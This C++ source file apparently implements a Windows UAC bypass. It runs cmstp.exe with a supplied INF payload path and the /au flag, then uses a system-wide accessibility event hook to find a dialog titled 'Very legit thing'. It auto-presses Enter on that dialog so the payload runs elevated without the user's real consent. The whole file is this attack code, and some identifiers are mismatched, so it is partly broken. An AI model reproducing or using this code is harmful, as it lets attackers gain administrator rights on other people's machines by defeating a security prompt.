#include "pch.h"
#include "framework.h"
#include "AutoEscalation.h"

ESCALATION_API BOOL CALLBACK exmButtonCallback(
	_In_ HWND   hwnd
)
{
	UINT i;
	HWND hwndButton;

	SetFocus(hwnd);

	hwndButton = GetDlgItem(hwnd, 1);
	//if (hwndButton == NULL)
	//	hwndButton = GetDlgItem(hwnd, 1117);

	if (hwndButton) {
		SendMessage(hwnd, WM_NEXTDLGCTL, (WPARAM)hwndButton, TRUE);
		PostMessage(hwnd, WM_KEYDOWN, (WPARAM)0x0D, MAKELPARAM(0, 0)); // client relative
		SendMessage(hwnd, WM_NCHITTEST, NULL, MAKELPARAM(0, 0)); // system relative
		PostMessage(hwnd, WM_KEYUP, (WPARAM)0x0D, MAKELPARAM(0, 0)); // client relative

		return TRUE;
	}

	return FALSE;
}

// Callback function that handles events.
ESCALATION_API void CALLBACK exmHandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd,
	LONG idObject, LONG idChild,
	DWORD dwEventThread, DWORD dwmsEventTime)
{
	IAccessible* pAcc = NULL;
	VARIANT varChildl;
	HWND hwndNull;
	HRESULT hr = AccessibleObjectFromEvent(hwnd, idObject, idChild, &pAcc, &varChild);
	if ((hr == S_OK) && (pAcc != NULL))
	{
		BSTR bstrName;
		pAcc->get_accName(varChild, &bstrName);
		if (wcsncmp(bstrName, L"Very legit thing", 16) == 0)
		{
			ILog("Got window, performing callback");
			exmButtonCallback(hwnd);
			exmButtonCallback(hwndNull);
		}
		//ILog("%S\n", bstrName);
		SysFreeString(bstrName);
		pAcc->Release();
	}
}

ESCALATION_API LPVOID GetMainModuleBaseSecure()
{
	// GET POINTER TO MAIN (.EXE) MODULE BASE
	// Slightly slower (splitting milliseconds), works on x86, ARM, x84
	// Get pointer to the TEB
#if defined(_M_X64) // x64
	auto pTeb = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD>(&static_cast<PNT_TIB>(nullptr)->Self)));
#elif defined(_M_ARM) // ARM
	auto pTeb = reinterpret_cast<PTEB>(_MoveFromCoprocessor(15, 0, 13, 0, 2)); // CP15_TPIDRURW
#else // x86
	auto pTeb = reinterpret_cast<PTEB>(__readfsdword(reinterpret_cast<DWORD>(&static_cast<PNT_TIB>(nullptr)->Self)));
#endif

	// Get pointer to the PEB
	auto pPeb = pTeb->ProcessEnvironmentBlock;
	const auto base = pPeb->ImageBaseAddress;
	return base;
}

// Initializes COM and sets up the event hook.
ESCALATION_API HWINEVENTHOOK exmInitializeMSAA(std::wstring& sPayloadPath)
{
#ifdef _DEBUG
	FILE* newstdin = nullptr;
	FILE* newstdout = nullptr;
	FILE* newstderr = nullptr;
	freopen_s(&newstdin, "CONIN$", "r", stdin);
	freopen_s(&newstdout, "CONOUT$", "w", stdout);
	freopen_s(&newstderr, "CONOUT$", "w", stderr);
#endif
	CMSTP cmstp;
	PCMSTP p_cmstp = &cmstp;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	std::wstring commandLine = L"cmstp.exe \"" + sPayloadPath + L"\" /au";
	LPWSTR ncPayloadPath = new WCHAR[commandLine.length() + 1];
	wcscpy_s(ncPayloadPath, commandLine.length() + 1, commandLine.c_str());

	ILog("Payload path: %ls\n", ncPayloadPath);
	
	CoInitialize(NULL);
	HWINEVENTHOOK hwekWND = SetWinEventHook(
		EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_MENUEND,  // Range of events (4 to 5).
		(HMODULE)GetMainModuleBaseSecure,  // Handle to DLL.
		exmHandleWinEvent,     // The callback.
		0, 0,                  // Process and thread IDs of interest (0 = all)
		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS); // Flags.
	if (hwekWND != 0)
		ILog("Windows event hook set\n");
	else
		ILog("Failed to set hook\n");
	CreateProcess(NULL, ncPayloadPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	delete[] ncPayloadPath;
	return hwekWND;
}

// Unhooks the event and shuts down COM.
ESCALATION_API void exmShutdownMSAA(HWINEVENTHOOK hwekWND)
{
	UnhookWinEvent(hwekWND);
	CoUninitialize();
}
